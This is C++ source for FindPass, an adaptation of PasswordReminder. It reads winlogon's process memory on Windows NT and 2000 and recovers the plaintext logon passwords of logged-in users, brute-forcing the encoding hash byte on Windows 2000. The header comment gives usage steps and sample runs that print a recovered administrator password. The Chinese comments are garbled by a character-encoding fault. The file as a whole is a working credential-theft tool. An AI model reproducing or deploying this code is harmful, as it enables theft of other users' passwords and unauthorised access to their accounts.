// Find Password from winlogon in win2000 / winnt4 + < sp6
//
// PasswordReminder.cpp --> FindPass.cpp
// 1. http://www.smidgeonsoft.com/
// 2. shotgun add comment, bingle change a little to find other user in winlogon
// This code is licensed under the terms of the GPL (gnu public license). 
//
// Usage: FindPass  DomainName UserName PID-of-WinLogon
//
// you can get the three params from pulist output in target system.
//

/*
��Ϊ��½���������û��������Ĵ洢��winlogon������ģ���PasswordReminder���޶��˲��ұ������û�������
<167-174��    GetEnvironmentVariableW(L"USERNAME", UserName, 0x400); 
    GetEnvironmentVariableW (L"USERDOMAIN", UserDomain, 0x400); 
>��Ȼ��winlogon���̵Ŀռ��в���UserDomain��UserName < 590:// ��WinLogon���ڴ�ռ���Ѱ��UserName��DomainName���ַ��� 
if ((wcscmp ((wchar_t *) RealStartingAddressP, UserName) == 0) 
&& 
(wcscmp ((wchar_t *) ((DWORD) RealStartingAddressP + USER_DOMAIN_OFFSET_WIN2K), UserDomain) == 0)) 
> ���ҵ���Ͳ��ߵļ��ܿ�� 

��ʵֻҪ���Լ�ָ���û�����winlogon����ȥ���Ҿ����ˣ�ֻҪ���ǹ���Ա���κα�����msgina.dllͼ�ε�½���û���������ҵ��� 

1. pulist���ҵ�ϵͳ���½���������û�������winlogon����id 
2. Ȼ���ÿ��winlogon����id����ָ�����û������ˡ�

example: 

C:\Documents and Settings\bingle>pulist 
Process           PID  User 
Idle              0 
System            8 
smss.exe          164  NT AUTHORITY\SYSTEM 
csrss.exe         192  NT AUTHORITY\SYSTEM 
winlogon.exe      188  NT AUTHORITY\SYSTEM 
wins.exe          1212 NT AUTHORITY\SYSTEM 
Explorer.exe      388  TEST-2KSERVER\Administrator 
internat.exe      1828 TEST-2KSERVER\Administrator 
conime.exe        1868 TEST-2KSERVER\Administrator 
msiexec.exe       1904 NT AUTHORITY\SYSTEM 
tlntsvr.exe       1048 NT AUTHORITY\SYSTEM 
taskmgr.exe       1752 TEST-2KSERVER\Administrator 
csrss.exe         2056 NT AUTHORITY\SYSTEM 
winlogon.exe      2416 NT AUTHORITY\SYSTEM 
rdpclip.exe       2448 TEST-2KSERVER\clovea 
Explorer.exe      2408 TEST-2KSERVER\clovea 
internat.exe      1480 TEST-2KSERVER\clovea 
cmd.exe           2508 TEST-2KSERVER\Administrator 
ntshell.exe       368  TEST-2KSERVER\Administrator 
ntshell.exe       1548 TEST-2KSERVER\Administrator 
ntshell.exe       1504 TEST-2KSERVER\Administrator 
csrss.exe         1088 NT AUTHORITY\SYSTEM 
winlogon.exe      1876 NT AUTHORITY\SYSTEM 
rdpclip.exe       1680 TEST-2KSERVER\bingle 
Explorer.exe      2244 TEST-2KSERVER\bingle 
conime.exe        2288 TEST-2KSERVER\bingle 
internat.exe      1592 TEST-2KSERVER\bingle 
cmd.exe           1692 TEST-2KSERVER\bingle 
mdm.exe           2476 TEST-2KSERVER\bingle 
taskmgr.exe       752  TEST-2KSERVER\bingle 
pulist.exe        2532 TEST-2KSERVER\bingle 

C:\Documents and Settings\bingle>D:\FindPass.exe TEST-2KSERVER 
administrator 188 

         To Find Password in the Winlogon process 
Usage: D:\FindPass.exe DomainName UserName PID-of-WinLogon 

The debug privilege has been added to PasswordReminder. 
The WinLogon process id is 188 (0x000000bc). 
To find TEST-2KSERVER\administrator password in process 188 ... 
The encoded password is found at 0x008e0800 and has a length of 10. 
The logon information is: TEST-2KSERVER/administrator/testserver. 
The hash byte is: 0x13. 

C:\Documents and Settings\bingle>D:\FindPass.exe TEST-2KSERVER 
clovea 1876 

         To Find Password in the Winlogon process 
Usage: D:\FindPass.exe DomainName UserName PID-of-WinLogon 

The debug privilege has been added to PasswordReminder. 
The WinLogon process id is 1876 (0x00000754). 
To find TEST-2KSERVER\clovea password in process 1876 ... 
PasswordReminder is unable to find the password in memory. 

C:\Documents and Settings\bingle>D:\FindPass.exe TEST-2KSERVER 
bingle 1876 

         To Find Password in the Winlogon process 
Usage: D:\FindPass.exe DomainName UserName PID-of-WinLogon 

The debug privilege has been added to PasswordReminder. 
The WinLogon process id is 1876 (0x00000754). 
To find TEST-2KSERVER\bingle password in process 1876 ... 
The logon information is: TEST-2KSERVER/bingle. 
There is no password. 

C:\Documents and Settings\bingle>D:\FindPass.exe TEST-2KSERVER 
clovea 2416 

         To Find Password in the Winlogon process 
Usage: D:\FindPass.exe DomainName UserName PID-of-WinLogon 

The debug privilege has been added to PasswordReminder. 
The WinLogon process id is 2416 (0x00000970). 
To find TEST-2KSERVER\clovea password in process 2416 ... 
The logon information is: TEST-2KSERVER/clovea. 
There is no password. 

C:\Documents and Settings\bingle> 

*/

#include <stdafx.h>
#include <windows.h> 
#include <tchar.h> 
#include <stdio.h> 
#include <stdlib.h> 

typedef struct _UNICODE_STRING 
{ 
    USHORT Length; 
    USHORT MaximumLength; 
    PWSTR Buffer; 
} UNICODE_STRING, *PUNICODE_STRING; 

// Undocumented typedef's 
typedef struct _QUERY_SYSTEM_INFORMATION 
{ 
    DWORD GrantedAccess; 
    DWORD PID; 
    WORD HandleType; 
    WORD HandleId; 
    DWORD Handle; 
} QUERY_SYSTEM_INFORMATION, *PQUERY_SYSTEM_INFORMATION; 
typedef struct _PROCESS_INFO_HEADER 
{ 
    DWORD Count; 
    DWORD Unk04; 
    DWORD Unk08; 
} PROCESS_INFO_HEADER, *PPROCESS_INFO_HEADER; 
typedef struct _PROCESS_INFO 
{ 
    DWORD LoadAddress; 
    DWORD Size; 
    DWORD Unk08; 
    DWORD Enumerator; 
    DWORD Unk10; 
    char Name [0x108]; 
} PROCESS_INFO, *PPROCESS_INFO; 
typedef struct _ENCODED_PASSWORD_INFO 
{ 
    DWORD HashByte; 
    DWORD Unk04; 
    DWORD Unk08; 
    DWORD Unk0C; 
    FILETIME LoggedOn; 
    DWORD Unk18; 
    DWORD Unk1C; 
    DWORD Unk20; 
    DWORD Unk24; 
    DWORD Unk28; 
    UNICODE_STRING EncodedPassword; 
} ENCODED_PASSWORD_INFO, *PENCODED_PASSWORD_INFO; 

typedef DWORD (__stdcall *PFNNTQUERYSYSTEMINFORMATION)  (DWORD, PVOID, DWORD, PDWORD); 
typedef PVOID (__stdcall *PFNRTLCREATEQUERYDEBUGBUFFER) (DWORD, DWORD); 
typedef DWORD (__stdcall *PFNRTLQUERYPROCESSDEBUGINFORMATION) (DWORD, DWORD, PVOID); 
typedef void (__stdcall *PFNRTLDESTROYQUERYDEBUGBUFFER) (PVOID); 
typedef void (__stdcall *PFNTRTLRUNDECODEUNICODESTRING)  (BYTE, PUNICODE_STRING); 

// Private Prototypes 
BOOL IsWinNT (void); 
BOOL IsWin2K (void); 
BOOL AddDebugPrivilege (void); 
DWORD FindWinLogon (void); 
BOOL LocatePasswordPageWinNT (DWORD, PDWORD); 
BOOL LocatePasswordPageWin2K (DWORD, PDWORD); 
void DisplayPasswordWinNT (void); 
void DisplayPasswordWin2K (void); 

// Global Variables 
PFNNTQUERYSYSTEMINFORMATION pfnNtQuerySystemInformation; 
PFNRTLCREATEQUERYDEBUGBUFFER pfnRtlCreateQueryDebugBuffer; 
PFNRTLQUERYPROCESSDEBUGINFORMATION pfnRtlQueryProcessDebugInformation; 
PFNRTLDESTROYQUERYDEBUGBUFFER pfnRtlDestroyQueryDebugBuffer; 
PFNTRTLRUNDECODEUNICODESTRING pfnRtlRunDecodeUnicodeString; 

DWORD PasswordLength = 0; 
PVOID RealPasswordP = NULL; 
PVOID PasswordP = NULL; 
DWORD HashByte = 0;
wchar_t UserName [0x400]; 
wchar_t UserDomain [0x400]; 

int __cdecl main( int argc, char* argv[] ) 
{ 
    printf( "\n\t To Find Password in the Winlogon process\n" );
	printf( " Usage: %s DomainName UserName PID-of-WinLogon\n\n", argv[0] ); 

    if ((!IsWinNT ()) 
            && 
        (!IsWin2K ())) 
    { 
        printf ("Windows NT or Windows 2000 are required.\n"); 
        return (0); 
    } 

    // Add debug privilege to PasswordReminder - 
    // this is needed for the search for Winlogon. 
    // ����PasswordReminder��Ȩ�� 
    // ʹ��PasswordReminder���Դ򿪲�����Winlogon���� 
    if (!AddDebugPrivilege ()) 
    { 
        printf 
            ("Unable to add debug privilege.\n"); 
        return (0); 
    } 
    printf ("The debug privilege has been added to PasswordReminder.\n"); 

    // ��ü���δ����API����ڵ�ַ 
    HINSTANCE hNtDll = 
        LoadLibrary 
            ("NTDLL.DLL"); 
    pfnNtQuerySystemInformation = 
        (PFNNTQUERYSYSTEMINFORMATION) GetProcAddress 
            (hNtDll, 
            "NtQuerySystemInformation"); 
    pfnRtlCreateQueryDebugBuffer = 
        (PFNRTLCREATEQUERYDEBUGBUFFER) GetProcAddress 
            (hNtDll, 
            "RtlCreateQueryDebugBuffer"); 
    pfnRtlQueryProcessDebugInformation = 
        (PFNRTLQUERYPROCESSDEBUGINFORMATION) GetProcAddress 
            (hNtDll, 
            "RtlQueryProcessDebugInformation"); 
    pfnRtlDestroyQueryDebugBuffer = 
        (PFNRTLDESTROYQUERYDEBUGBUFFER) GetProcAddress 
            (hNtDll, 
            "RtlDestroyQueryDebugBuffer"); 
    pfnRtlRunDecodeUnicodeString = 
        (PFNTRTLRUNDECODEUNICODESTRING) GetProcAddress 
            (hNtDll, 
            "RtlRunDecodeUnicodeString"); 

    // Locate WinLogon's PID - need debug privilege and admin rights. 
    // ���Winlogon���̵�PID 
    // ��������ʹ���˼���Native API����ʵʹ��PSAPIһ������ 
    DWORD WinLogonPID = 
        argc > 3 ? atoi( argv[3] ) : FindWinLogon () ; 
    if (WinLogonPID == 0) 
    { 
        printf 
            ("PasswordReminder is unable to find WinLogon or you are using NWGINA.DLL.\n"); 
        printf 
            ("PasswordReminder is unable to find the password in memory.\n"); 
        FreeLibrary (hNtDll); 
        return (0); 
    } 

	printf("The WinLogon process id is %d (0x%8.8lx).\n", 
			WinLogonPID, WinLogonPID); 

    // Set values to check memory block against. 
    // ��ʼ���������û��˺���صı��� 
	memset(UserName, 0, sizeof (UserName)); 
	memset(UserDomain, 0, sizeof (UserDomain)); 
	if( argc > 2 )
	{	
		mbstowcs( UserName, argv[2], sizeof(UserName)/sizeof(*UserName) );
		mbstowcs( UserDomain, argv[1], sizeof(UserDomain)/sizeof(*UserDomain) );
	}else
	{
		GetEnvironmentVariableW(L"USERNAME", UserName, 0x400); 
		GetEnvironmentVariableW(L"USERDOMAIN", UserDomain, 0x400); 
	}
	printf( " To find %S\\%S password in process %d ...\n", UserDomain, UserName, WinLogonPID );

    // Locate the block of memory containing 
    // the password in WinLogon's memory space. 
    // ��Winlogon�����ж�λ����Password���ڴ�� 
    BOOL FoundPasswordPage = FALSE; 
    if (IsWin2K ()) 
        FoundPasswordPage = 
            LocatePasswordPageWin2K 
                (WinLogonPID, 
                &PasswordLength); 
    else 
        FoundPasswordPage = 
            LocatePasswordPageWinNT 
                (WinLogonPID, 
                &PasswordLength); 

    if (FoundPasswordPage) 
    { 
        if (PasswordLength == 0) 
        { 
            printf 
                ("The logon information is: %S/%S.\n", 
                UserDomain, 
                UserName); 
            printf 
                ("There is no password.\n"); 
        } 
        else 
        { 
            printf 
                ("The encoded password is found at 0x%8.8lx and has a length of %d.\n", 
                RealPasswordP, 
                PasswordLength); 
            // Decode the password string. 
            if (IsWin2K ()) 
                DisplayPasswordWin2K (); 
            else 
                DisplayPasswordWinNT (); 
        } 
    } 
    else 
        printf 
            ("PasswordReminder is unable to find the password in memory.\n"); 

    FreeLibrary 
        (hNtDll); 
    return (0); 
} // main 

// 
// IsWinNT���������жϲ���ϵͳ�Ƿ�WINNT 
// 
BOOL 
    IsWinNT 
        (void) 
{ 
    OSVERSIONINFO OSVersionInfo; 
    OSVersionInfo.dwOSVersionInfoSize = sizeof (OSVERSIONINFO); 
    if (GetVersionEx 
            (&OSVersionInfo)) 
        return (OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT); 
    else 
        return (FALSE); 
} // IsWinNT 


// 
// IsWin2K���������жϲ���ϵͳ�Ƿ�Win2K 
// 
BOOL 
    IsWin2K 
        (void) 
{ 
    OSVERSIONINFO OSVersionInfo; 
    OSVersionInfo.dwOSVersionInfoSize = sizeof (OSVERSIONINFO); 
    if (GetVersionEx 
            (&OSVersionInfo)) 
        return ((OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT) 
                    && 
                (OSVersionInfo.dwMajorVersion == 5)); 
    else 
        return (FALSE); 
} // IsWin2K 


// 
// AddDebugPrivilege���������������Winlogon���̵���Ȩ 
// 
BOOL 
    AddDebugPrivilege 
        (void) 
{ 
    HANDLE Token; 
    TOKEN_PRIVILEGES TokenPrivileges, PreviousState; 
    DWORD ReturnLength = 0; 
    if (OpenProcessToken 
            (GetCurrentProcess (), 
            TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, 
            &Token)) 
        if (LookupPrivilegeValue 
                (NULL, 
                "SeDebugPrivilege", 
                &TokenPrivileges.Privileges[0].Luid)) 
        { 
            TokenPrivileges.PrivilegeCount = 1; 
            TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
            return 
                (AdjustTokenPrivileges 
                    (Token, 
                    FALSE, 
                    &TokenPrivileges, 
                    sizeof (TOKEN_PRIVILEGES), 
                    &PreviousState, 
                    &ReturnLength)); 
        } 
    return (FALSE); 
} // AddDebugPrivilege 


// 
// Note that the following code eliminates the need 
// for PSAPI.DLL as part of the executable. 
// FindWinLogon��������Ѱ��WinLogon���� 
// ��������ʹ�õ���Native API����˲���ҪPSAPI��֧�� 
// 
DWORD 
    FindWinLogon 
        (void) 
{ 
#define INITIAL_ALLOCATION 0x100 
    DWORD rc = 0; 
    DWORD SizeNeeded = 0; 
    PVOID InfoP = 
        HeapAlloc 
            (GetProcessHeap (), 
            HEAP_ZERO_MEMORY, 
            INITIAL_ALLOCATION); 
    // Find how much memory is required. 
    pfnNtQuerySystemInformation 
        (0x10, 
        InfoP, 
        INITIAL_ALLOCATION, 
        &SizeNeeded); 
    HeapFree 
        (GetProcessHeap (), 
        0, 
        InfoP); 
    // Now, allocate the proper amount of memory. 
    InfoP = 
        HeapAlloc 
            (GetProcessHeap (), 
            HEAP_ZERO_MEMORY, 
            SizeNeeded); 
    DWORD SizeWritten = SizeNeeded; 
    if (pfnNtQuerySystemInformation 
            (0x10, 
            InfoP, 
            SizeNeeded, 
            &SizeWritten)) 
    { 
        HeapFree 
            (GetProcessHeap (), 
            0, 
            InfoP); 
        return (0); 
    } 
    DWORD NumHandles = SizeWritten / sizeof (QUERY_SYSTEM_INFORMATION); 
    if (NumHandles == 0) 
    { 
        HeapFree 
            (GetProcessHeap (), 
            0, 
            InfoP); 
        return (0); 
    } 
    PQUERY_SYSTEM_INFORMATION QuerySystemInformationP = 
        (PQUERY_SYSTEM_INFORMATION) InfoP; 
    DWORD i; 
    for (i = 1; i <= NumHandles; i++) 
    { 
        // "5" is the value of a kernel object type process. 
        if (QuerySystemInformationP->HandleType == 5) 
        { 
            PVOID DebugBufferP = 
                pfnRtlCreateQueryDebugBuffer 
                    (0, 
                    0); 
            if (pfnRtlQueryProcessDebugInformation 
                    (QuerySystemInformationP->PID, 
                    1, 
                    DebugBufferP) == 0) 
            { 
                PPROCESS_INFO_HEADER ProcessInfoHeaderP = 
                    (PPROCESS_INFO_HEADER) ((DWORD) DebugBufferP + 0x60); 
                DWORD Count = 
                    ProcessInfoHeaderP->Count; 
                PPROCESS_INFO ProcessInfoP = 
                    (PPROCESS_INFO) ((DWORD) ProcessInfoHeaderP + sizeof (PROCESS_INFO_HEADER)); 
                if (strstr (_strupr (ProcessInfoP->Name), "WINLOGON") != 0) 
                { 
                    DWORD i; 
                    DWORD dw = (DWORD) ProcessInfoP; 
                    for (i = 0; i < Count; i++) 
                    { 
                        dw += sizeof (PROCESS_INFO); 
                        ProcessInfoP = (PPROCESS_INFO) dw; 
                        if (strstr (_strupr (ProcessInfoP->Name), "NWGINA") != 0) 
                            return (0); 
                        if (strstr (_strupr (ProcessInfoP->Name), "MSGINA") == 0) 
                            rc = 
                                QuerySystemInformationP->PID; 
                    } 
                    if (DebugBufferP) 
                        pfnRtlDestroyQueryDebugBuffer 
                            (DebugBufferP); 
                    HeapFree 
                        (GetProcessHeap (), 
                        0, 
                        InfoP); 
                    return (rc); 
                } 
            } 
            if (DebugBufferP) 
                pfnRtlDestroyQueryDebugBuffer 
                    (DebugBufferP); 
        } 
        DWORD dw = (DWORD) QuerySystemInformationP; 
        dw += sizeof (QUERY_SYSTEM_INFORMATION); 
        QuerySystemInformationP = (PQUERY_SYSTEM_INFORMATION) dw; 
    } 
    HeapFree 
        (GetProcessHeap (), 
        0, 
        InfoP); 
    return (rc); 
} // FindWinLogon 

// 
// LocatePasswordPageWinNT����������NT���ҵ��û����� 
// 
BOOL 
    LocatePasswordPageWinNT 
        (DWORD WinLogonPID, 
        PDWORD PasswordLength) 
{ 
#define USER_DOMAIN_OFFSET_WINNT    0x200 
#define USER_PASSWORD_OFFSET_WINNT    0x400 
    BOOL rc = FALSE; 
    HANDLE WinLogonHandle = 
        OpenProcess 
            (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
            FALSE, 
            WinLogonPID); 
    if (WinLogonHandle == 0) 
        return (rc); 
    *PasswordLength = 0; 
    SYSTEM_INFO SystemInfo; 
    GetSystemInfo 
        (&SystemInfo); 
    DWORD PEB = 0x7ffdf000; 
    DWORD BytesCopied = 0; 
    PVOID PEBP = 
        HeapAlloc 
            (GetProcessHeap (), 
            HEAP_ZERO_MEMORY, 
            SystemInfo.dwPageSize); 
    if (!ReadProcessMemory 
            (WinLogonHandle, 
            (PVOID) PEB, 
            PEBP, 
            SystemInfo.dwPageSize, 
            &BytesCopied)) 
    { 
        CloseHandle 
            (WinLogonHandle); 
        return (rc); 
    } 
    // Grab the value of the 2nd DWORD in the TEB. 
    PDWORD WinLogonHeap = (PDWORD) ((DWORD) PEBP + (6 * sizeof (DWORD))); 
    MEMORY_BASIC_INFORMATION MemoryBasicInformation; 
    if (VirtualQueryEx 
            (WinLogonHandle, 
            (PVOID) *WinLogonHeap, 
            &MemoryBasicInformation, 
            sizeof (MEMORY_BASIC_INFORMATION))) 
        if (((MemoryBasicInformation.State & MEM_COMMIT) == MEM_COMMIT) 
                && 
            ((MemoryBasicInformation.Protect & PAGE_GUARD) == 0)) 
        { 
            PVOID WinLogonMemP = 
                HeapAlloc 
                    (GetProcessHeap (), 
                    HEAP_ZERO_MEMORY, 
                    MemoryBasicInformation.RegionSize); 
            if (ReadProcessMemory 
                    (WinLogonHandle, 
                    (PVOID) *WinLogonHeap, 
                    WinLogonMemP, 
                    MemoryBasicInformation.RegionSize, 
                    &BytesCopied)) 
            { 
                DWORD i = (DWORD) WinLogonMemP; 
                DWORD UserNamePos = 0; 
                // The order in memory is UserName followed by the UserDomain. 
                // ���ڴ�������UserName��UserDomain�ַ��� 
                do 
                { 
                    if ((wcsicmp (UserName, (wchar_t *) i) == 0) 
                            && 
                        (wcsicmp (UserDomain, (wchar_t *) (i + USER_DOMAIN_OFFSET_WINNT)) == 0)) 
                    { 
                        UserNamePos = i; 
                        break; 
                    } 
                    i += 2; 
                } while (i < (DWORD) WinLogonMemP + MemoryBasicInformation.RegionSize); 
                if (UserNamePos) 
                { 
                    PENCODED_PASSWORD_INFO EncodedPasswordInfoP = 
                        (PENCODED_PASSWORD_INFO) 
                            ((DWORD) UserNamePos + USER_PASSWORD_OFFSET_WINNT); 
                    FILETIME LocalFileTime; 
                    SYSTEMTIME SystemTime; 
                    if (FileTimeToLocalFileTime 
                        (&EncodedPasswordInfoP->LoggedOn, 
                        &LocalFileTime)) 
                        if (FileTimeToSystemTime 
                            (&LocalFileTime, 
                            &SystemTime)) 
                            printf 
                                ("You logged on at %d/%d/%d %d:%d:%d\n", 
                                SystemTime.wMonth, 
                                SystemTime.wDay, 
                                SystemTime.wYear, 
                                SystemTime.wHour, 
                                SystemTime.wMinute, 
                                SystemTime.wSecond); 
                    *PasswordLength = 
                        (EncodedPasswordInfoP->EncodedPassword.Length & 0x00ff) / sizeof (wchar_t); 
                    // NT���Ǻã�hash-byteֱ�ӷ��ڱ�����:) 
                    HashByte = 
                        (EncodedPasswordInfoP->EncodedPassword.Length & 0xff00) >> 8; 
                    RealPasswordP = 
                        (PVOID) (*WinLogonHeap + 
                            (UserNamePos - (DWORD) WinLogonMemP) + 
                            USER_PASSWORD_OFFSET_WINNT + 0x34); 
                    PasswordP = 
                        (PVOID) ((PBYTE) (UserNamePos +   
                            USER_PASSWORD_OFFSET_WINNT + 0x34)); 
                    rc = TRUE; 
                } 
            } 
        } 

    HeapFree 
        (GetProcessHeap (), 
        0, 
        PEBP); 
    CloseHandle 
        (WinLogonHandle); 
    return (rc); 
} // LocatePasswordPageWinNT 


// 
// LocatePasswordPageWin2K����������Win2K���ҵ��û����� 
// 
BOOL 
    LocatePasswordPageWin2K 
        (DWORD WinLogonPID, 
        PDWORD PasswordLength) 
{ 
#define USER_DOMAIN_OFFSET_WIN2K    0x400 
#define USER_PASSWORD_OFFSET_WIN2K    0x800 
    HANDLE WinLogonHandle = 
        OpenProcess 
            (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
            FALSE, 
            WinLogonPID); 
    if (WinLogonHandle == 0) 
        return (FALSE); 
    *PasswordLength = 0; 
    SYSTEM_INFO SystemInfo; 
    GetSystemInfo 
        (&SystemInfo); 
    DWORD i = (DWORD) SystemInfo.lpMinimumApplicationAddress; 
    DWORD MaxMemory = (DWORD) SystemInfo.lpMaximumApplicationAddress; 
    DWORD Increment = SystemInfo.dwPageSize; 
    MEMORY_BASIC_INFORMATION MemoryBasicInformation; 
    while (i < MaxMemory) 
    { 
        if (VirtualQueryEx 
                (WinLogonHandle, 
                (PVOID) i, 
                &MemoryBasicInformation, 
                sizeof (MEMORY_BASIC_INFORMATION))) 
        { 
            Increment = MemoryBasicInformation.RegionSize; 
            if (((MemoryBasicInformation.State & MEM_COMMIT) == MEM_COMMIT) 
                    && 
                ((MemoryBasicInformation.Protect & PAGE_GUARD) == 0)) 
            { 
                PVOID RealStartingAddressP = 
                    HeapAlloc 
                        (GetProcessHeap (), 
                        HEAP_ZERO_MEMORY, 
                        MemoryBasicInformation.RegionSize); 
                DWORD BytesCopied = 0; 
                if (ReadProcessMemory 
                        (WinLogonHandle, 
                        (PVOID) i, 
                        RealStartingAddressP, 
                        MemoryBasicInformation.RegionSize, 
                        &BytesCopied)) 
                { 
                    // ��WinLogon���ڴ�ռ���Ѱ��UserName��DomainName���ַ��� 
                    if ((wcsicmp ((wchar_t *) RealStartingAddressP, UserName) == 0) 
                            && 
                        (wcsicmp ((wchar_t *) ((DWORD) RealStartingAddressP + USER_DOMAIN_OFFSET_WIN2K), UserDomain) == 0)) 
                    { 
                        RealPasswordP = (PVOID) (i + USER_PASSWORD_OFFSET_WIN2K); 
                        PasswordP = (PVOID) ((DWORD) RealStartingAddressP + USER_PASSWORD_OFFSET_WIN2K); 
                        // Calculate the length of encoded unicode string. 
                        // ��������ĵĳ��� 
                        PBYTE p = (PBYTE) PasswordP; 
                        DWORD Loc = (DWORD) p; 
                        DWORD Len = 0; 
                        if ((*p == 0) 
                                && 
                            (* (PBYTE) ((DWORD) p + 1) == 0)) 
                            ; 
                        else 
                            do 
                            { 
                                Len++; 
                                Loc += 2; 
                                p = (PBYTE) Loc; 
                            } while 
                                (*p != 0); 
                        *PasswordLength = Len; 
                        CloseHandle 
                            (WinLogonHandle); 
                        return (TRUE); 
                    } 
                } 
                HeapFree 
                    (GetProcessHeap (), 
                    0, 
                    RealStartingAddressP); 
            } 
        } 
        else 
            Increment = SystemInfo.dwPageSize; 
        // Move to next memory block. 
        i += Increment; 
    } 
    CloseHandle 
        (WinLogonHandle); 
    return (FALSE); 
} // LocatePasswordPageWin2K 


// 
// DisplayPasswordWinNT����������NT�н����û����� 
// 
void 
    DisplayPasswordWinNT 
        (void) 
{ 
    UNICODE_STRING EncodedString; 
    EncodedString.Length = 
        (WORD) PasswordLength * sizeof (wchar_t); 
    EncodedString.MaximumLength = 
        ((WORD) PasswordLength * sizeof (wchar_t)) + sizeof (wchar_t); 
    EncodedString.Buffer = 
        (PWSTR) HeapAlloc 
            (GetProcessHeap (), 
            HEAP_ZERO_MEMORY, 
            EncodedString.MaximumLength); 
    CopyMemory 
        (EncodedString.Buffer, 
        PasswordP, 
        PasswordLength * sizeof (wchar_t)); 
    // Finally - decode the password. 
    // Note that only one call is required since the hash-byte 
    // was part of the orginally encoded string. 
    // ��NT�У�hash-byte�ǰ����ڱ����е� 
    // ���ֻ��Ҫֱ�ӵ��ú�������Ϳ����� 
    pfnRtlRunDecodeUnicodeString 
        ((BYTE) HashByte, 
        &EncodedString); 
    printf 
        ("The logon information is: %S/%S/%S.\n", 
        UserDomain, 
        UserName, 
        EncodedString.Buffer); 
    printf 
        ("The hash byte is: 0x%2.2x.\n", 
        HashByte); 
    HeapFree 
        (GetProcessHeap (), 
        0, 
        EncodedString.Buffer); 
} // DisplayPasswordWinNT 

// 
// DisplayPasswordWin2K����������Win2K�н����û����� 
// 
void 
    DisplayPasswordWin2K 
        (void) 
{ 
    DWORD i, Hash = 0; 
    UNICODE_STRING EncodedString; 
    EncodedString.Length = 
        (USHORT) PasswordLength * sizeof (wchar_t); 
    EncodedString.MaximumLength = 
        ((USHORT) PasswordLength * sizeof (wchar_t)) + sizeof (wchar_t); 
    EncodedString.Buffer = 
        (PWSTR) HeapAlloc 
            (GetProcessHeap (), 
            HEAP_ZERO_MEMORY, 
            EncodedString.MaximumLength); 
    // This is a brute force technique since the hash-byte 
    // is not stored as part of the encoded string - :>(. 
    // ��Ϊ��Win2K��hash-byte��������ڱ����� 
    // ������������е��Ǳ����ƽ� 
    // �����ѭ����i����hash-byte 
    // ���ǽ�i��0x00��0xff�ֱ�����Ľ��н��� 
    // �����һ��hash-byteʹ���������붼�ǿɼ��ַ�������Ϊ����Ч�� 
    // ����㷨ʵ�����ǴӸ��ʽǶ�������� 
    // ��Ϊ���hash-byte���Զ����ܳ��������붼�ǿɼ��ַ��ĸ��ʷǳ�С 
    for (i = 0; i <= 0xff; i++) 
    { 
        CopyMemory 
            (EncodedString.Buffer, 
            PasswordP, 
            PasswordLength * sizeof (wchar_t)); 
        // Finally - try to decode the password. 
        // ʹ��i��Ϊhash-byte�����Ľ��н��� 
        pfnRtlRunDecodeUnicodeString 
            ((BYTE) i, 
            &EncodedString); 
        // Check for a viewable password. 
        // ��������������Ƿ���ȫ�ɿɼ��ַ���� 
        // ���������Ϊ����ȷ�Ľ��� 
        PBYTE p = (PBYTE) EncodedString.Buffer; 
        BOOL Viewable = TRUE; 
        DWORD j, k; 
        for (j = 0; (j < PasswordLength) && Viewable; j++) 
        { 
            if ((*p) 
                    && 
                (* (PBYTE)(DWORD (p) + 1) == 0)) 
            { 
                if (*p < 0x20) 
                    Viewable = FALSE; 
                if (*p > 0x7e) 
                    Viewable = FALSE; 
                //0x20�ǿո�0X7E��~��������������ʹ�õĿɼ��ַ��������������� 
            } 
            else 
                Viewable = FALSE; 
            k = DWORD (p); 
            k++; k++; 
            p = (PBYTE) k; 
        } 
        if (Viewable) 
        { 
            printf 
                ("The logon information is: %S/%S/%S.\n", 
                UserDomain, 
                UserName, 
                EncodedString.Buffer); 
            printf 
                ("The hash byte is: 0x%2.2x.\n", 
                i); 
        } 
    } 
    HeapFree 
        (GetProcessHeap (), 
        0, 
        EncodedString.Buffer); 
} // DisplayPasswordWin2K 

// end PasswordReminder.cpp 
